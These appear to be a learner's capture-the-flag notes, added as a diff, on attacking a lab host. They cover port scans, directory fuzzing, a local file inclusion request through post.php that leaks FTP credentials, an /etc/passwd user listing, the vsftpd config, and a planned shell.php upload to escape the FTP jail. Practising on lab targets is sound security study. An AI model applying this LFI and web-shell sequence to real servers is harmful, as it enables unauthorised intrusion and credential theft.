@@ -1,0 +1,67 @@
+Informações relevantes:
+
+rustscan:
+
+Open 10.67.155.242:21
+Open 10.67.155.242:22
+Open 10.67.155.242:80
+
+nmap:
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 5a:8f:11:52:52:0f:65:72:ae:1f:a3:94:56:31:bd:79 (RSA)
+|   256 ba:d6:45:0c:57:73:48:f0:d9:d2:5c:a9:fd:51:33:ca (ECDSA)
+|_  256 3e:e6:7c:2e:da:e1:e7:73:94:89:73:80:77:b1:e8:3c (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Corkplacemats
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-generator: Jekyll v4.1.1
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+-> Jekyll v4.1.1
+-> Apache httpd 2.4.41
+
+fuzzing:
+
+images/                 [Status: 200, Size: 1360, Words: 82, Lines: 19, Duration: 204ms]
+index.php               [Status: 200, Size: 4826, Words: 1154, Lines: 135, Duration: 145ms]
+images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 146ms]
+robots.txt              [Status: 200, Size: 69, Words: 4, Lines: 4, Duration: 147ms]
+robots.txt              [Status: 200, Size: 69, Words: 4, Lines: 4, Duration: 146ms]
+css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 148ms]
+robots.txt              [Status: 200, Size: 69, Words: 4, Lines: 4, Duration: 144ms]
+css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 143ms]
+
+-> robots.txt: 
+	User-agent: *
+	Allow: /flag_1.txt --> Primeira flag
+	Allow: /secret_file_do_not_read.txt
+			|_> http://10.67.155.242/post.php?post=secret_file_do_not_read.txt pelo LFI foi possível
+				ler o arquivo secret file do not read e peguei as credenciais: 
+				|_> Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777
+
+User: Mat
+Username FTP: ftpuser
+Password  FTP: givemefiles777
+
+Filtrando usuários com /bin/bash do /etc/passwd:
+
+root:x:0:0:root:/root:/bin/bash
+will:x:1000:1000:will:/home/will:/bin/bash
+mat:x:1002:1002:,#,,:/home/mat:/bin/bash
+toby:x:1003:1003:,,,:/home/toby:/bin/bash
+
+achei a sacada em /etc/vsftpd.conf
+
+
+listen=NO listen_ipv6=YES anonymous_enable=NO local_enable=YES write_enable=YES local_umask=022 dirmessage_enable=YES use_localtime=YES xferlog_enable=YES connect_from_port_20=YES chroot_local_user=YES secure_chroot_dir=/var/run/vsftpd/empty pam_service_name=vsftpd force_dot_files=YES pasv_min_port=40000 pasv_max_port=50000 user_sub_token=$USER local_root=/home/$USER/ftp 
+
+-> sacada do file upload e break jail: /home/ftpuser/ftp/files/shell.php
+
+
+
+
